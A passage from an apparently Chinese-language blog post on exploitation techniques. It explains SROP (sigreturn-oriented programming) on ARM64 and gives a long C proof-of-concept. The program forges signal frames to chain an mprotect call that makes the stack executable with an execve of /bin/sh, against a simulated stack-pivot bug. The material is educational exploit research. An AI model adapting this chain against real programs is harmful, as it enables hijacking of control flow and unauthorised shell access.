/main</span><br><span class="line">0048c000-0048f000 rw-p 00000000 00:00 0 </span><br><span class="line">28044000-28066000 rw-p 00000000 00:00 0                                  [heap]</span><br><span class="line">ffffa0c63000-ffffa0c65000 r--p 00000000 00:00 0                          [vvar]</span><br><span class="line">ffffa0c65000-ffffa0c66000 r-xp 00000000 00:00 0                          [vdso]</span><br><span class="line">fffff31e5000-fffff3206000 rw-p 00000000 00:00 0                          [stack]</span><br><span class="line"> </span><br><span class="line">__kernel_rt_sigreturn:</span><br><span class="line">   0xffffa0c6585c:        mov     x8, #0x8b           // #139  __NR_rt_sigreturn</span><br><span class="line">   0xffffa0c65860:        svc     #0x0                            //d4000001</span><br></pre></td></tr></table></figure>

<p>这也就意味着只要<strong>攻击者控制了当前栈帧并执行一个 sys_rt_sigreturn 后，既可以控制当前用户态的所有通用硬件寄存器</strong>，包括：</p>
<ul>
<li>  R0-R29：即攻击者可以控制所有参数</li>
<li>  R30：即攻击者可以控制后续的函数返回地址</li>
<li>  PC：即攻击者可以控制 sys_rt_sigreturn 返回的地址</li>
<li>  SP：即攻击者可以控制返回后的栈帧</li>
</ul>
<p>简单说 <strong>sigreturn 实际上就是一个能力极其强大的 gadget，其可以完成任何参数设置，控制流转移，返回地址设置，堆栈指针修改操作</strong>。且由于 sigreturn 中本身就存在一条 svc 指令，攻击者同时还可以复用此 gadget 执行<strong>一次</strong> execve 来获取本地 shell。利用 SROP 执行 execve 的流程如下图：</p>
<p><img src="./490870_DCKHHZWXWTAYKXS.jpg"></p>
<p>但需要注意的是如果使用 SROP 来 chain 多个系统调用时，则还需一个额外的 syscall&ret; gadget, 这是因为 __kernel_rt_sigreturn 中虽然有一个可用的 svc 指令，但其后面通常没有 ret 指令，因此此 svc 指令其不能用来链接 gadgetchain。如当攻击者需要执行如 mprotect + shellcode 时，则需要找到一个 <code>svc 0; ret;</code> 指令序列来确保 mprotect 系统调用执行完毕后会有一条 ret 指令可以返回到 sigreturn 设置的 lr 寄存器位置。以下代码可用来简单测试 SROP 和基于 SROP 的 syscallchain：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;asm/ucontext.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="comment">/* rt_sigreturn check if sp is 16 byte aligned */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _ROUND_UP(x,n) (((x)+(n)-1u) &amp; ~((n)-1u))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ROUND_UP(x) _ROUND_UP(x,16LL)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ROUND_DOWN(x) ((x) &amp; (~((16LL)-1)))</span></span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sigframe</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">siginfo_t</span> info;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ucontext</span> <span class="title">uc</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sigframe</span> <span class="title">g_backup</span>;</span> <span class="comment">/* used to stuff new sigframe */</span></span><br><span class="line"><span class="keyword">void</span> * sigreturn_addr;        <span class="comment">/* address of sigreturn */</span></span><br><span class="line"><span class="keyword">void</span> * syscall_ret_addr;  <span class="comment">/* address of a gadget has syscall with ret insn to chain next directive */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">syscall_ret</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in"><span class="keyword">asm</span></span>(<span class="string">&quot;svc 0\n\t&quot;</span> :::); <span class="comment">/* simpliy emulate a syscall with ret*/</span></span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">action</span><span class="params">(<span class="keyword">int</span> signo, <span class="keyword">siginfo_t</span> *info, <span class="keyword">void</span> *ctx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">/* check struct size match */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sigframe</span> *<span class="title">sf</span> =</span> (<span class="keyword">void</span> *)info;</span><br><span class="line">    <span class="keyword">if</span>(&amp;sf-&gt;uc != ctx) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] sigframe struct size mismatch\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    sigreturn_addr = __builtin_return_address(<span class="number">0</span>);     <span class="comment">/* get sigreturn address */</span></span><br><span class="line">    g_backup.info = *info;</span><br><span class="line">    g_backup.uc = *(struct ucontext *)ctx;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_sys_from_signal</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sigaction</span> <span class="title">act</span>;</span></span><br><span class="line">    <span class="keyword">sigset_t</span> set, oldset;</span><br><span class="line"> </span><br><span class="line">    act.sa_sigaction = action;</span><br><span class="line">    act.sa_flags = SA_SIGINFO;</span><br><span class="line">    <span class="built_in">sigemptyset</span>(&amp;act.sa_mask);</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">sigemptyset</span>(&amp;set);</span><br><span class="line">    <span class="built_in">sigemptyset</span>(&amp;oldset);</span><br><span class="line">    <span class="built_in">sigaddset</span>(&amp;set, SIGUSR1);</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">sigaction</span>(SIGUSR1, &amp;act, <span class="literal">NULL</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">sigprocmask</span>(SIG_SETMASK, &amp;set, &amp;oldset);</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">kill</span>(<span class="built_in">getpid</span>(), SIGUSR1);</span><br><span class="line"> </span><br><span class="line">    <span class="comment">/* signal handler will executed before this sycall return */</span></span><br><span class="line">    <span class="built_in">sigprocmask</span>(SIG_SETMASK, &amp;oldset, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">env_init</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">/* get addr of sigreturn &amp; syscall insns. */</span></span><br><span class="line">    <span class="built_in">get_sys_from_signal</span>();</span><br><span class="line"> </span><br><span class="line">    syscall_ret_addr = &amp;syscall_ret;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span>(!sigreturn_addr) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] sigreturn_addr not set.\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] sigreturn addr:%p, syscall_ret addr:%p\n&quot;</span>, \</span><br><span class="line">        sigreturn_addr, syscall_ret_addr);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">show_maps</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ret;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">0x100</span>];</span><br><span class="line">    <span class="keyword">int</span> fd = <span class="built_in">open</span>(<span class="string">&quot;/proc/self/maps&quot;</span>, O_RDONLY);</span><br><span class="line">     </span><br><span class="line">    <span class="keyword">do</span> </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="built_in"><span class="keyword">sizeof</span></span>(buf));</span><br><span class="line">        ret = <span class="built_in">read</span>(fd, buf, <span class="built_in"><span class="keyword">sizeof</span></span>(buf));</span><br><span class="line">        <span class="built_in">write</span>(<span class="number">1</span>, &amp;buf, ret);</span><br><span class="line">    &#125; <span class="keyword">while</span>(ret);</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">write</span>(<span class="number">1</span>, <span class="string">&quot;\n&quot;</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">close</span>(fd);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  This function is used to simulate the vulnerability,</span></span><br><span class="line"><span class="comment">  (for simplicity) it directly switches the current sp</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vul_trigger</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> * new_sp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in"><span class="keyword">asm</span></span>(<span class="string">&quot;mov sp, %0\n\t&quot;</span></span><br><span class="line">    :</span><br><span class="line">    :<span class="string">&quot;r&quot;</span>(new_sp)</span><br><span class="line">    :);</span><br><span class="line"> </span><br><span class="line">    <span class="comment">/* ret address should be pop from epilogue in real exp,</span></span><br><span class="line"><span class="comment">       for stability in the test case, we just change it manurally</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="function"><span class="keyword">register</span> <span class="keyword">volatile</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> lr <span class="title">asm</span><span class="params">(<span class="string">&quot;x30&quot;</span>)</span> </span>= sigreturn_addr;</span><br><span class="line">    <span class="built_in"><span class="keyword">asm</span></span>(<span class="string">&quot;ret\n\t&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">stuff_sigframe3</span><span class="params">(struct sigframe * sf, <span class="keyword">int</span> scno,</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="keyword">void</span> * pc, <span class="keyword">void</span> * lr, <span class="keyword">void</span> * sp,</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="keyword">void</span> * arg0, <span class="keyword">void</span> * arg1, <span class="keyword">void</span> *arg2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ucontext</span> * <span class="title">uc</span> =</span> &amp;sf-&gt;uc;</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">memset</span>(sf, <span class="number">0</span>, <span class="built_in"><span class="keyword">sizeof</span></span>(struct sigframe));</span><br><span class="line">     </span><br><span class="line">    uc-&gt;uc_mcontext = g_backup.uc.uc_mcontext; <span class="comment">/* __reserved copies from g_backup */</span></span><br><span class="line"> </span><br><span class="line">    uc-&gt;uc_mcontext.regs[<span class="number">30</span>] = lr;</span><br><span class="line">    uc-&gt;uc_mcontext.pc = pc;</span><br><span class="line">    uc-&gt;uc_mcontext.sp = sp;</span><br><span class="line">    uc-&gt;uc_mcontext.regs[<span class="number">8</span>] = scno;</span><br><span class="line">    uc-&gt;uc_mcontext.regs[<span class="number">0</span>] = arg0;</span><br><span class="line">    uc-&gt;uc_mcontext.regs[<span class="number">1</span>] = arg1;</span><br><span class="line">    uc-&gt;uc_mcontext.regs[<span class="number">2</span>] = arg2;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sigframe_push_mprotect</span><span class="params">(struct sigframe * frame, <span class="keyword">void</span> * addr,</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="keyword">unsigned</span> <span class="keyword">long</span> size, <span class="keyword">int</span> prot, <span class="keyword">void</span> * pc, <span class="keyword">void</span> * lr, <span class="keyword">void</span> * sp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] add to sigframe(%016p): mprotect(%p, %x, %x); \n&quot;</span>, frame, addr, size, prot);</span><br><span class="line">    <span class="built_in">stuff_sigframe3</span>(frame, SYS_mprotect, pc, lr, sp, addr, size, prot);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sigframe_push_exec</span><span class="params">(struct sigframe * frame, <span class="keyword">char</span> * name,</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="keyword">void</span> * argv, <span class="keyword">void</span> * envp, <span class="keyword">void</span> * pc, <span class="keyword">void</span> * sp, <span class="keyword">void</span> * lr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] add to sigframe(%016p): execve(%s, %p, %p); \n&quot;</span>, frame, name, argv, envp);</span><br><span class="line">    <span class="built_in">stuff_sigframe3</span>(frame, SYS_execve, pc, lr, sp, name, argv, envp);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test_mprotect</span><span class="params">(<span class="keyword">void</span> * sigret_stack, <span class="keyword">void</span> * addr, <span class="keyword">int</span> size, <span class="keyword">int</span> prot)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> ret = __builtin_return_address(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> cfa = __builtin_frame_address(<span class="number">1</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="comment">/* set a sigframe for sigreturn to call mprotect, and set paramters to let </span></span><br><span class="line"><span class="comment">       mprot return to the write caller (current lr), with right sp (cfa). */</span></span><br><span class="line">    <span class="built_in">sigframe_push_mprotect</span>(sigret_stack, addr, size, prot, syscall_ret_addr, ret, cfa);</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">vul_trigger</span>(sigret_stack);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test_mprotect_wrapper</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">/* For qemu-user, this struct can&#x27;t put in funcion like test_mprotect_wrapper,</span></span><br><span class="line"><span class="comment">      otherwise the vdso insn will lost (should be a bug of qemu) */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sigframe</span> <span class="title">frame</span> __<span class="title">attribute__</span>((<span class="title">aligned</span>(0<span class="title">x10</span>)));</span></span><br><span class="line"> </span><br><span class="line">    <span class="keyword">void</span> * sigret_stack = &amp;frame;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">/* set a &#x27;ret&#x27; insn in no executable stack for test if mprotect is succeed. */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> __attribute__((<span class="built_in">aligned</span>(<span class="number">0x1000</span>))) data = <span class="number">0xd65f03c0</span>; </span><br><span class="line"> </span><br><span class="line">    <span class="built_in">test_mprotect</span>(sigret_stack, &amp;data, <span class="number">0x1000</span>, PROT_READ|PROT_WRITE|PROT_EXEC);</span><br><span class="line"> </span><br><span class="line">    <span class="comment">/* stack is RWX for now, function p only execute a single &#x27;ret&#x27; insn and can</span></span><br><span class="line"><span class="comment">       return normally. It will cause a crash if mprotect not work. */</span></span><br><span class="line">    <span class="built_in"><span class="keyword">void</span></span> (*p)(<span class="keyword">void</span>) = &amp;data;</span><br><span class="line">    <span class="built_in">p</span>();</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sigframe_for_exec</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sigframe</span> <span class="title">frame</span> __<span class="title">attribute__</span>((<span class="title">aligned</span>(0<span class="title">x10</span>)));</span></span><br><span class="line">    <span class="keyword">void</span> * argv[<span class="number">2</span>] __attribute__((<span class="built_in">aligned</span>(<span class="number">0x10</span>)));</span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">0</span>];</span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> * <span class="title">test_exec</span><span class="params">(<span class="keyword">char</span> * name, <span class="keyword">int</span> shot)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> ret = __builtin_return_address(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> cfa = __builtin_frame_address(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">void</span> * arg0, * arg1 = <span class="literal">NULL</span>, * arg2 = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="comment">/* </span></span><br><span class="line"><span class="comment">       for busybox, we need to give a argv &#123;&quot;/bin/sh&quot;, NULL&#125;;</span></span><br><span class="line"><span class="comment">       for real shell it can be zero;</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">int</span> strlength = <span class="built_in">ROUND_UP</span>(<span class="built_in">strlen</span>(name) + <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">int</span> size = <span class="built_in">ROUND_UP</span>(<span class="built_in"><span class="keyword">sizeof</span></span>(struct sigframe_for_exec) + strlength);</span><br><span class="line"> </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sigframe_for_exec</span> * <span class="title">sf_exec</span> =</span> <span class="built_in">malloc</span>(size);</span><br><span class="line">    <span class="built_in">memset</span>(sf_exec, <span class="number">0</span>, size);</span><br><span class="line"> </span><br><span class="line">    arg0 = sf_exec-&gt;name;</span><br><span class="line">    <span class="built_in">memcpy</span>(arg0, name, <span class="built_in"><span class="keyword">sizeof</span></span>(name));</span><br><span class="line"> </span><br><span class="line">    <span class="comment">/* --------- no need for real shell ------ */</span></span><br><span class="line">    sf_exec-&gt;argv[<span class="number">0</span>] = arg0;</span><br><span class="line">    arg1 = sf_exec-&gt;argv;</span><br><span class="line">    <span class="comment">/* ----------------------------------- */</span></span><br><span class="line"> </span><br><span class="line">    <span class="built_in">sigframe_push_exec</span>(&amp;sf_exec-&gt;frame, arg0, arg1, arg2, sigreturn_addr + <span class="number">4</span>, ret, cfa);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span>(shot)</span><br><span class="line">        <span class="built_in">vul_trigger</span>(sf_exec);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> sf_exec;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test_mprotect_exec</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">/* For qemu-user, this struct can&#x27;t put in funcion like test_mprotect_wrapper,</span></span><br><span class="line"><span class="comment">      otherwise the vdso insn will lost (should be a bug of qemu) */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sigframe</span> <span class="title">frame</span> __<span class="title">attribute__</span>((<span class="title">aligned</span>(0<span class="title">x10</span>)));</span></span><br><span class="line"> </span><br><span class="line">    <span class="keyword">void</span> * next_sigframe = &amp;frame;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">void</span> * prev_sigframe = <span class="built_in">test_exec</span>(<span class="string">&quot;/bin/sh&quot;</span>, <span class="number">0</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> ret = __builtin_return_address(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> cfa = __builtin_frame_address(<span class="number">1</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">       // for exec mprotect</span></span><br><span class="line"><span class="comment">       1) set stack executable: ret &amp; 0xfff, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC</span></span><br><span class="line"><span class="comment">           2) call sigreturn, set pc = syscall_ret_addr, which can use a &#x27;svc&#x27; insn to execute mprotect</span></span><br><span class="line"><span class="comment">       3) next insn of &#x27;svc&#x27; is a &#x27;ret&#x27;, &#x27;ret&#x27; will redirect pc to sigreturn_addr (address of sigreturn)</span></span><br><span class="line"><span class="comment">       // for exec execve</span></span><br><span class="line"><span class="comment">       4) call sigreturn again, just set pc = &#x27;sigreturn + 4&#x27;, use that &#x27;svc&#x27; to execute execve syscall</span></span><br><span class="line"><span class="comment">          execve will not return, so &#x27;ret&#x27; insn is not needed in this case.</span></span><br><span class="line"><span class="comment">       pc = syscall_ret_addr is used in step 2) to call a mprotect and is next insn used to control the control flow.</span></span><br><span class="line"><span class="comment">       lr = sigreturn_addr is used in step 3) to chain mprotect with another sigreturn</span></span><br><span class="line"><span class="comment">       sp = prev_sigframe is used in step 4) as paramter of sigreturn to redirect control to next &#x27;svc&#x27;, aka execve.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="built_in">sigframe_push_mprotect</span>(next_sigframe, \</span><br><span class="line">        ret &amp; ~(<span class="number">0xfff</span>), <span class="number">0x1000</span>, PROT_READ|PROT_WRITE|PROT_EXEC, \</span><br><span class="line">        syscall_ret_addr, sigreturn_addr, prev_sigframe);</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">vul_trigger</span>(next_sigframe);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">show_maps</span>();</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">env_init</span>();</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">test_mprotect_wrapper</span>();                <span class="comment">/* mprotect and return normally */</span></span><br><span class="line"> </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] test mprotect RWX succeed!\n&quot;</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="comment">//test_exec(&quot;/bin/sh&quot;, 1);         /* execve only */</span></span><br><span class="line"> </span><br><span class="line">    <span class="built_in">test_mprotect_exec</span>();                     <span class="comment">/* chain mprotext with a execve */</span></span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>test case 输出如下:</p>
